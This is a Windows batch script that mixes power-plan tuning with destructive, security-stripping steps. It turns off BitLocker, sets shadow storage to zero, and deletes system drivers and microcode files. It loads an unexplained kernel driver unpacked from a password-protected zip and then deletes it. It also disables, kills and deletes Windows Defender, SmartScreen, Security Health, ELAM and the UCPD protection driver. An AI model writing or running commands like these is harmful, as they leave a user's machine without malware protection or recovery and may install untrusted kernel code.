if "%~1" neq "running" (start "" /b cmd /c "%~f0" running & exit /b) else (cd /d "%~dp0")
fsutil behavior set allowextchar 0
fsutil behavior set Bugcheckoncorrupt 0
fsutil behavior set disable8dot3 1
fsutil behavior set DisableCompression 1
fsutil behavior set disabledeletenotify 0
fsutil behavior set disableencryption 1
fsutil behavior set disablelastaccess 1
fsutil behavior set disablespotcorruptionhandling 1
fsutil behavior set encryptpagingfile 0
fsutil behavior set memoryusage 2
fsutil behavior set mftzone 4
fsutil behavior set quotanotify 4294967295
fsutil behavior set enablenonpagedntfs 1
fsutil behavior set disablewriteautotiering 1
fsutil 8dot3name set 1
fsutil repair set C: 0
fsutil repair set D: 0
fsutil repair set E: 0
fsutil repair set F: 0
fsutil repair set G: 0
fsutil quota disable C:
fsutil quota disable D:
fsutil quota disable E:
fsutil quota disable F:
fsutil quota disable G:
fsutil resource setautoreset true c:\
fsutil resource setautoreset true d:\
fsutil resource setautoreset true e:\
fsutil resource setautoreset true f:\
fsutil resource setautoreset true g:\
manage-bde -off C:
manage-bde -off D:
manage-bde -off E:
manage-bde -off F:
manage-bde -off G:
net user defaultuser0 /delete
net user defaultuser1 /delete
net user defaultuser100000 /delete
compact /compactos:never
::vssadmin resize shadowstorage /for=C: /on=C: /maxsize=5%% & rem system restore on
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=0%% & rem system restore off
for %%a in ("SleepStudy" "Kernel-Processor-Power" "UserModePowerService") do (wevtutil sl Microsoft-Windows-%%a/Diagnostic /e:false)
takeown /f "C:\Windows\Prefetch" /r /d y >nul 2>&1
icacls "C:\Windows\Prefetch" /grant "Administrator":(OI)(CI)F /t >nul 2>&1
rd /s /q "C:\Windows\Prefetch" >nul 2>&1
takeown /f "%SystemRoot%\System32\drivers\Acpidev.sys"
takeown /f "%SystemRoot%\System32\drivers\Acpipagr.sys"
takeown /f "%SystemRoot%\System32\drivers\Acpitime.sys"
takeown /f "%SystemRoot%\System32\drivers\Acpipmi.sys"
icacls "%SystemRoot%\System32\drivers\Acpidev.sys" /grant %username%:F
icacls "%SystemRoot%\System32\drivers\Acpipagr.sys" /grant %username%:F
icacls "%SystemRoot%\System32\drivers\Acpitime.sys" /grant %username%:F
icacls "%SystemRoot%\System32\drivers\Acpipmi.sys" /grant %username%:F
del /f /q "%SystemRoot%\System32\drivers\Acpidev.sys"
del /f /q "%SystemRoot%\System32\drivers\Acpipagr.sys"
del /f /q "%SystemRoot%\System32\drivers\Acpitime.sys"
del /f /q "%SystemRoot%\System32\drivers\Acpipmi.sys"
takeown /f "C:\Windows\System32\mcupdate_GenuineIntel.dll"
takeown /f "C:\Windows\System32\mcupdate_AuthenticAMD.dll"
icacls "%SystemRoot%\System32\mcupdate_GenuineIntel.dll" /grant %username%:F
icacls "%SystemRoot%\System32\mcupdate_AuthenticAMD.dll" /grant %username%:F
del "C:\Windows\System32\mcupdate_GenuineIntel.dll"
del "C:\Windows\System32\mcupdate_AuthenticAMD.dll"
takeown /f "C:\Windows\System32\GameBarPresenceWriter.exe"
takeown /f "C:\Windows\System32\GameBarPresenceWriter.proxy.dll"
takeown /f "C:\Windows\System32\Windows.Gaming.UI.GameBar.dll"
icacls "%SystemRoot%\System32\GameBarPresenceWriter.exe" /grant %username%:F
icacls "%SystemRoot%\System32\GameBarPresenceWriter.proxy.dll" /grant %username%:F
icacls "%SystemRoot%\System32\Windows.Gaming.UI.GameBar.dll" /grant %username%:F
del "C:\Windows\System32\GameBarPresenceWriter.exe"
del "C:\Windows\System32\GameBarPresenceWriter.proxy.dll"
del "C:\Windows\System32\Windows.Gaming.UI.GameBar.dll"
takeown /f "C:\Windows\System32\bcastdvr.exe" >NUL 2>&1
takeown /f "C:\Windows\System32\bcastdvruserservice.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\bcastdvr.proxy.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\BcastDVRCommon.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\BcastDVRBroker.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\BcastDVRClient.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\en-US\bcastdvruserservice.dll.mui" >NUL 2>&1
icacls "%SystemRoot%\System32\bcastdvr.exe" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\bcastdvruserservice.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\bcastdvr.proxy.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\BcastDVRCommon.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\BcastDVRBroker.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\BcastDVRClient.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\en-US\bcastdvruserservice.dll.mui" /grant %username%:F >NUL 2>&1
del "C:\Windows\System32\bcastdvr.exe" >NUL 2>&1
del "C:\Windows\System32\bcastdvruserservice.dll" >NUL 2>&1
del "C:\Windows\System32\bcastdvr.proxy.dll" >NUL 2>&1
del "C:\Windows\System32\BcastDVRCommon.dll" >NUL 2>&1
del "C:\Windows\System32\BcastDVRBroker.dll" >NUL 2>&1
del "C:\Windows\System32\BcastDVRClient.dll" >NUL 2>&1
del "C:\Windows\System32\en-US\bcastdvruserservice.dll.mui" >NUL 2>&1
takeown /f "%SystemRoot%\System32\spool\drivers\color" /r /d y >NUL 2>&1
icacls "%SystemRoot%\System32\spool\drivers\color" /grant Administrators:F /t >NUL 2>&1
del /f /s /q "%SystemRoot%\System32\spool\drivers\color\*.*" >NUL 2>&1
for /D %%D in ("%SystemRoot%\System32\spool\drivers\color\*") do rmdir /s /q "%%D" >NUL 2>&1
takeown /f "%WinDir%\HelpPane.exe" >NUL 2>&1
icacls "%WinDir%\HelpPane.exe" /deny "Everyone:(X)" >NUL 2>&1
taskkill /f /t /im SearchHost.exe >NUL 2>&1
( taskkill /f /t /im SearchHost.exe & takeown /s %computername% /u %username% /f "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" & icacls "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" /grant:r %username%:F & taskkill /im SearchHost.exe /f & del "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" /s /f /q ) >NUL 2>&1
takeown /F %windir%\System32\CompatTelRunner.exe > NUL 2>&1
icacls %windir%\System32\CompatTelRunner.exe /grant %username%:F > NUL 2>&1
del %windir%\System32\CompatTelRunner.exe /f > NUL 2>&1
takeown /f "%ProgramFiles%\Microsoft GameInput" /r /d y >nul 2>&1
icacls "%ProgramFiles%\Microsoft GameInput" /grant %username%:F /t >nul 2>&1
rd /s /q "%ProgramFiles%\Microsoft GameInput" >nul 2>&1
takeown /f "%SystemRoot%\System32\GameInputRedist.dll" >nul 2>&1
icacls "%SystemRoot%\System32\GameInputRedist.dll" /grant %username%:F >nul 2>&1
del /f /q "%SystemRoot%\System32\GameInputRedist.dll" >nul 2>&1
cd /d "%~dp0"
set "DKSys=%~dp0iamdrvd77hello.sys"
"C:\Program Files\7-Zip\7z.exe" x -aoa -bso0 -bsp1 "%~dp0DKTT.zip" -p"DDK" "iamdrvd77hello.sys" >nul
sc create dkkddkkk type= kernel binPath= "%DKSys%" >nul 2>&1
net start dkkddkkk
timeout /t 2 /nobreak >nul
sc stop dkkddkkk >nul 2>&1
net start dkkddkkk
sc stop dkkddkkk >nul 2>&1
sc delete dkkddkkk >nul 2>&1
del /q "%DKSys%" >nul 2>&1
sc config SecurityHealthService start= disabled >NUL 2>&1
sc stop SecurityHealthService >NUL 2>&1
sc config wscsvc start= disabled >NUL 2>&1
sc stop wscsvc >NUL 2>&1
sc config Sense start= disabled >NUL 2>&1
sc stop Sense >NUL 2>&1
sc config SgrmBroker start= disabled >NUL 2>&1
sc stop SgrmBroker >NUL 2>&1
sc config SgrmAgent start= disabled >NUL 2>&1
sc stop SgrmAgent >NUL 2>&1
sc config WdNisSvc start= disabled >NUL 2>&1
sc stop WdNisSvc >NUL 2>&1
sc config webthreatdefsvc start= disabled >NUL 2>&1
sc stop webthreatdefsvc >NUL 2>&1
sc config webthreatdefusersvc start= disabled >NUL 2>&1
sc stop webthreatdefusersvc >NUL 2>&1
sc config MDDlpSvc start= disabled >NUL 2>&1
sc stop MDDlpSvc >NUL 2>&1
sc config MDCoreSvc start= disabled >NUL 2>&1
sc stop MDCoreSvc >NUL 2>&1
sc config whesvc start= disabled >NUL 2>&1
sc stop whesvc >NUL 2>&1
sc config WdFilter start= disabled >NUL 2>&1
sc stop WdFilter >NUL 2>&1
sc config WdNisDrv start= disabled >NUL 2>&1
sc stop WdNisDrv >NUL 2>&1
sc config MsSecFlt start= disabled >NUL 2>&1
sc stop MsSecFlt >NUL 2>&1
sc config MsSecCore start= disabled >NUL 2>&1
sc stop MsSecCore >NUL 2>&1
sc config MsSecWfp start= disabled >NUL 2>&1
sc stop MsSecWfp >NUL 2>&1
sc config PlutonHeci start= disabled >NUL 2>&1
sc stop PlutonHeci >NUL 2>&1
sc config PlutonHsp2 start= disabled >NUL 2>&1
sc stop PlutonHsp2 >NUL 2>&1
sc config Hsp start= disabled >NUL 2>&1
sc stop Hsp >NUL 2>&1
sc config WinDefend start= disabled >NUL 2>&1
sc stop WinDefend >NUL 2>&1
sc config WdBoot start= disabled >NUL 2>&1
sc stop WdBoot >NUL 2>&1
taskkill /f /t /im smartscreen.exe >NUL 2>&1
taskkill /f /t /im MsMpEng.exe >NUL 2>&1
taskkill /f /t /im NisSrv.exe >NUL 2>&1
taskkill /f /t /im MpDefenderCoreService.exe >NUL 2>&1
taskkill /f /t /im AggregatorHost.exe >NUL 2>&1
taskkill /f /t /im CrossDeviceResume.exe >NUL 2>&1
takeown /f "C:\ProgramData\Microsoft\Windows Defender" /r /d y >NUL 2>&1
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\ProgramData\Microsoft\Windows Defender" >NUL 2>&1
takeown /f "C:\Program Files\Windows Defender" /r /d y >NUL 2>&1
icacls "C:\Program Files\Windows Defender" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\Program Files\Windows Defender" >NUL 2>&1
takeown /f "C:\Program Files (x86)\Windows Defender" /r /d y >NUL 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\Program Files (x86)\Windows Defender" >NUL 2>&1
takeown /f "C:\Program Files\Windows Defender Advanced Threat Protection" /r /d y >NUL 2>&1
icacls "C:\Program Files\Windows Defender Advanced Threat Protection" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\Program Files\Windows Defender Advanced Threat Protection" >NUL 2>&1
takeown /f "%ProgramData%\Microsoft\Windows Defender" /r /d y >nul 2>&1 & icacls "%ProgramData%\Microsoft\Windows Defender" /grant *S-1-5-32-544:(OI)(CI)F /t /c >nul 2>&1 & rd /s /q "%ProgramData%\Microsoft\Windows Defender" >nul 2>&1
::%windir%\\System32\\SecurityHealthSSO.dll can break windows logon
for %%F in (C:\Windows\WinSxS\FileMaps\wow64_windows-defender*.manifest C:\Windows\WinSxS\FileMaps\x86_windows-defender*.manifest C:\Windows\WinSxS\FileMaps\amd64_windows-defender*.manifest C:\Windows\System32\SecurityAndMaintenance_Error.png C:\Windows\System32\SecurityAndMaintenance.png C:\Windows\System32\SecurityHealthSystray.exe C:\Windows\System32\SecurityHealthService.exe C:\Windows\System32\SecurityHealthHost.exe C:\Windows\System32\MpSigStub.exe C:\Windows\System32\drivers\SgrmAgent.sys C:\Windows\System32\drivers\WdDevFlt.sys C:\Windows\System32\drivers\WdBoot.sys C:\Windows\System32\webthreatdefsvc.dll C:\Windows\System32\webthreatdefusersvc.dll C:\Windows\System32\webthreatdefsvc.dll.mui C:\Windows\System32\webthreatdefusersvc.dll.mui C:\Windows\System32\drivers\WdFilter.sys C:\Windows\System32\wscsvc.dll C:\Windows\System32\drivers\WdNisDrv.sys C:\Windows\System32\wscproxystub.dll C:\Windows\System32\wscisvif.dll C:\Windows\System32\SecurityHealthProxyStub.dll C:\Windows\System32\smartscreen.dll C:\Windows\SysWOW64\smartscreen.dll C:\Windows\System32\smartscreen.exe C:\Windows\SysWOW64\smartscreen.exe C:\Windows\System32\SmartScreenSettings.exe C:\Windows\SysWOW64\SmartScreenSettings.exe C:\Windows\System32\DWWIN.EXE C:\Windows\SysWOW64\smartscreenps.dll C:\Windows\System32\smartscreenps.dll C:\Windows\System32\SecurityHealthCore.dll C:\Windows\System32\SecurityHealthSsoUdk.dll C:\Windows\System32\SecurityHealthSSO.dll C:\Windows\System32\SecurityHealthSSO.dll.mui C:\Windows\System32\SecurityHealthUdk.dll C:\Windows\System32\SecurityHealthAgent.dll C:\Windows\System32\drivers\mssecwfp.sys C:\Windows\System32\drivers\mssecwfp.sys.mui C:\Windows\System32\winshfhc.dll C:\Windows\SysWOW64\winshfhc.dll C:\Windows\System32\mssecwfpu.dll C:\Windows\System32\wscapi.dll C:\Windows\System32\wscadminui.exe C:\Windows\System32\ieapfltr.dll C:\Windows\SysWOW64\ieapfltr.dll C:\Windows\System32\SgrmLpac.exe C:\Windows\System32\Sgrm\SgrmLpac.exe C:\Windows\System32\drivers\SgrmAgent.sys C:\Windows\System32\SgrmBroker.exe C:\Windows\System32\Sgrm\SgrmBroker.exe C:\Windows\System32\Sgrm\SgrmAssertions.bin C:\Windows\System32\Sgrm\SgrmAssertions.cat C:\Windows\System32\SgrmEnclave.dll C:\Windows\System32\Sgrm\SgrmEnclave.dll C:\Windows\System32\SgrmEnclave_secure.dll C:\Windows\System32\Sgrm\SgrmEnclave_secure.dll C:\Windows\ELAMBKUP\WdBoot.sys C:\Windows\System32\config\ELAM C:\Windows\System32\mssecuser.dll C:\Windows\System32\windowsdefenderapplicationguardcsp.dll C:\Windows\SysWOW64\windowsdefenderapplicationguardcsp.dll C:\Windows\SysWOW64\GameBarPresenceWriter.exe C:\Windows\System32\GameBarPresenceWriter.exe C:\Windows\SysWOW64\DeviceCensus.exe C:\Windows\SysWOW64\CompatTelRunner.exe C:\Windows\system32\drivers\msseccore.sys C:\Windows\system32\drivers\MsSecFltWfp.sys C:\Windows\system32\drivers\MsSecFlt.sys C:\Windows\System32\SecurityHealth\SecurityHealthSSO.dll C:\Windows\System32\SecurityHealth\SecurityHealthSSO.dll.mui) do if exist "%%~F" (takeown /f "%%~F" /a >nul 2>&1 & icacls "%%~F" /grant *S-1-5-32-544:F /c /l >nul 2>&1 & del /f /q "%%~F")
for /d %%D in ("C:\Windows\WinSxS\amd64_security-octagon*" "C:\Windows\WinSxS\x86_windows-defender*" "C:\Windows\WinSxS\wow64_windows-defender*" "C:\Windows\WinSxS\amd64_windows-defender*" "C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy" "C:\ProgramData\Microsoft\Windows Defender" "C:\Program Files\Windows Defender Sleep" "C:\Program Files\Microsoft Update Health Tools" "C:\Windows\security\database" "C:\Program Files\Windows Security" "C:\Program Files\PCHealthCheck" "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection" "C:\Program Files (x86)\Windows Defender Advanced Threat Protection" "C:\Program Files\Windows Defender Advanced Threat Protection" "C:\ProgramData\Microsoft\Windows Security Health" "C:\ProgramData\Microsoft\Storage Health" "C:\WINDOWS\System32\drivers\wd" "C:\Program Files (x86)\Windows Defender" "C:\Program Files\Windows Defender" "C:\Windows\System32\SecurityHealth" "C:\Windows\System32\WebThreatDefSvc" "C:\Windows\System32\Sgrm" "C:\Windows\Containers\WindowsDefenderApplicationGuard.wim" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\System32\Tasks_Migrated\Microsoft\Windows\Windows Defender" "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\System32\HealthAttestationClient" "C:\Windows\GameBarPresenceWriter" "C:\Windows\bcastdvr" "C:\Windows\Containers\serviced\WindowsDefenderApplicationGuard.wim") do if exist "%%~D" (takeown /f "%%~D" /r /d y & icacls "%%~D" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c & rd /s /q "%%~D")
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-AppxPackage -AllUsers | Where-Object { $_.Name -like '*SecHealthUI*' } | Remove-AppxPackage -ErrorAction SilentlyContinue; Get-AppxProvisionedPackage -Online | Where-Object { $_.DisplayName -like '*SecHealthUI*' } | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue"
::net stop Audiosrv /y >nul 2>&1
::net stop AudioEndpointBuilder /y >nul 2>&1
powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.FriendlyName -like '*Voice Clarity*'} | ForEach-Object { $inf = (pnputil /get-device-info $_.InstanceId | Select-String 'Driver Name').ToString().Split(': ')[-1]; if($inf) { pnputil /delete-driver $inf /uninstall /force } }" >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.FriendlyName -like '*Voice Clarity*'} | Select-Object -ExpandProperty InstanceId"') do pnputil /remove-device "%%i" >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.FriendlyName -like '*Audio Home*'} | Select-Object -ExpandProperty InstanceId"') do pnputil /remove-device "%%i" >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.InstanceId -like '*VOCAEFFECTPACK*' -or $_.InstanceId -like '*AUDIOHOME*'} | Select-Object -ExpandProperty InstanceId"') do pnputil /remove-device "%%i" /subtree >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "(Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\DRIVERENUM').Name | Where-Object {$_ -like '*VOCAEFFECTPACK*' -or $_ -like '*AUDIOHOME*'}"') do reg add "HKLM\SYSTEM\CurrentControlSet\Enum\SWD\DRIVERENUM\%%~nxi" /v "ConfigFlags" /t REG_DWORD /d 0x1 /f >nul 2>&1
::net start AudioEndpointBuilder >nul 2>&1
::net start Audiosrv >nul 2>&1
net stop ucpd >nul 2>&1
taskkill /f /im "*UCPD*" >nul 2>&1
taskkill /f /im "*UCPDMgr*" >nul 2>&1
takeown /f "%SystemRoot%\System32\UCPDMgr.exe" /a >nul 2>&1
icacls "%SystemRoot%\System32\UCPDMgr.exe" /grant:r "%username%:F" /t >nul 2>&1
attrib -s -h -r "%SystemRoot%\System32\UCPDMgr.exe" >nul 2>&1
del /f /q "%SystemRoot%\System32\UCPDMgr.exe" >nul 2>&1
takeown /f "%SystemRoot%\System32\drivers\UCPD.sys" /a >nul 2>&1
icacls "%SystemRoot%\System32\drivers\UCPD.sys" /grant:r "%username%:F" /t >nul 2>&1
attrib -s -h -r "%SystemRoot%\System32\drivers\UCPD.sys" >nul 2>&1
del /f /q "%SystemRoot%\System32\drivers\UCPD.sys" >nul 2>&1
takeown /f "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" /a >nul 2>&1
icacls "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" /grant:r "%username%:F" /t >nul 2>&1
attrib -s -h -r "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" >nul 2>&1
del /f /q "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" >nul 2>&1
for /r "%SystemRoot%\WinSxS" %%f in (*UCPD*.sys *UCPDMgr*.exe) do (takeown /f "%%f" /a >nul 2>&1 & icacls "%%f" /grant:r "%username%:F" /t >nul 2>&1 & attrib -s -h -r "%%f" >nul 2>&1 & del /f /q "%%f" >nul 2>&1 & if exist "%%f" ren "%%f" "%%~nxf.disabled" >nul 2>&1)
powercfg -change monitor-timeout-ac 0
powercfg -change standby-timeout-ac 0
powercfg -change hibernate-timeout-ac 0
powercfg -change disk-timeout-ac 0
powercfg -change monitor-timeout-dc 0
powercfg -change standby-timeout-dc 0
powercfg -change hibernate-timeout-dc 0
powercfg -change disk-timeout-dc 0
powercfg -setacvalueindex SCHEME_CURRENT SUB_SLEEP STANDBYIDLE 0
powercfg -setdcvalueindex SCHEME_CURRENT SUB_SLEEP STANDBYIDLE 0
powercfg -setdcvalueindex scheme_current sub_sleep hybridsleep 0
powercfg -setacvalueindex scheme_current sub_sleep hybridsleep 0
powercfg -setacvalueindex SCHEME_CURRENT SUB_PCIEXPRESS ee12f906-d277-404b-b6da-e5fa1a576df5 0
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PCIEXPRESS ee12f906-d277-404b-b6da-e5fa1a576df5 0
::powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR 4b92d758-5a24-4851-a470-815d78aee119 100
::powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR 4b92d758-5a24-4851-a470-815d78aee119 100
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR 4b92d758-5a24-4851-a470-815d78aee119 0
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR 4b92d758-5a24-4851-a470-815d78aee119 0
::powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR 7b224883-b3cc-4d79-819f-8374152cbe7c 100
::powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR 7b224883-b3cc-4d79-819f-8374152cbe7c 100
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR 7b224883-b3cc-4d79-819f-8374152cbe7c 0
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR 7b224883-b3cc-4d79-819f-8374152cbe7c 0
::powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR 893dee8e-2bef-41e0-89c6-b55d0929964c 1
::powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR 893dee8e-2bef-41e0-89c6-b55d0929964c 1
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR 893dee8e-2bef-41e0-89c6-b55d0929964c 100
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR 893dee8e-2bef-41e0-89c6-b55d0929964c 100
powercfg -setacvalueindex SCHEME_CURRENT SUB_DISK dbc9e238-6de9-49e3-92cd-8c2b4946b472 1
powercfg -setdcvalueindex SCHEME_CURRENT SUB_DISK dbc9e238-6de9-49e3-92cd-8c2b4946b472 1
powercfg -setacvalueindex SCHEME_CURRENT SUB_DISK fc95af4d-40e7-4b6d-835a-56d131dbc80e 1
powercfg -setdcvalueindex SCHEME_CURRENT SUB_DISK fc95af4d-40e7-4b6d-835a-56d131dbc80e 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 0d7dbae2-4294-402a-ba8e-26777e8488cd 309dce9b-bef4-4119-9921-a851fb12f0f4 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 0012ee47-9041-4b5d-9b77-535fba8b1442 d639518a-e56d-4345-8af2-b9f32fb26109 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 0012ee47-9041-4b5d-9b77-535fba8b1442 d639518a-e56d-4345-8af2-b9f32fb26109 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 0012ee47-9041-4b5d-9b77-535fba8b1442 d3d55efd-c1ff-424e-9dc3-441be7833010 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 0012ee47-9041-4b5d-9b77-535fba8b1442 d3d55efd-c1ff-424e-9dc3-441be7833010 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 0853a681-27c8-4100-a2fd-82013e970683 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 0853a681-27c8-4100-a2fd-82013e970683 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 d4e98f31-5ffe-4ce1-be31-1b38b384c009 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 d4e98f31-5ffe-4ce1-be31-1b38b384c009 0
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 48672f38-7a9a-4bb2-8bf8-3d85be19de4e 2bfc24f9-5ea2-4801-8213-3dbae01aa39d 6
::powercfg /SETACVALUEINDEX SCHEME_CURRENT 48672f38-7a9a-4bb2-8bf8-3d85be19de4e 2bfc24f9-5ea2-4801-8213-3dbae01aa39d 4
::powercfg /SETDCVALUEINDEX SCHEME_CURRENT 48672f38-7a9a-4bb2-8bf8-3d85be19de4e 2bfc24f9-5ea2-4801-8213-3dbae01aa39d 4
powercfg /SETACVALUEINDEX SCHEME_CURRENT 48672f38-7a9a-4bb2-8bf8-3d85be19de4e 2bfc24f9-5ea2-4801-8213-3dbae01aa39d 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 48672f38-7a9a-4bb2-8bf8-3d85be19de4e 2bfc24f9-5ea2-4801-8213-3dbae01aa39d 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_INTSTEER MODE 1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_INTSTEER MODE 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 94ac6d29-73ce-41a6-809f-6363ba21b47e 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 25dfa149-5dd1-4736-b5ab-e8a37b5b8187 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 bd3b718a-0680-4d9d-8ab2-e1d2b4ac806d 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 bd3b718a-0680-4d9d-8ab2-e1d2b4ac806d 0
::
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFCHECK 5000
powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFCHECK 5000
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 4d2b0152-7d5c-498b-88e2-34345392a2c5 5000
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 4d2b0152-7d5c-498b-88e2-34345392a2c5 5000
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLECHECK 200000
powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLECHECK 200000
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 c4581c31-89ab-4597-8e2b-9c9cab440e6b 200000
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 c4581c31-89ab-4597-8e2b-9c9cab440e6b 200000
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFEPP 0
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFEPP 0
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFEPP1 0
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFEPP1 0
::
powercfg -attributes SUB_PROCESSOR PERFBOOSTMODE -ATTRIB_HIDE
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 5
::powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 2
::powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 1
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 5
::powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 2
::powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 1
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTPOL 100
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTPOL 100
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 cfeda3d0-7697-4566-a922-a9086cd49dfa 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 54533251-82be-4824-96c1-47b60b740d00 cfeda3d0-7697-4566-a922-a9086cd49dfa 0
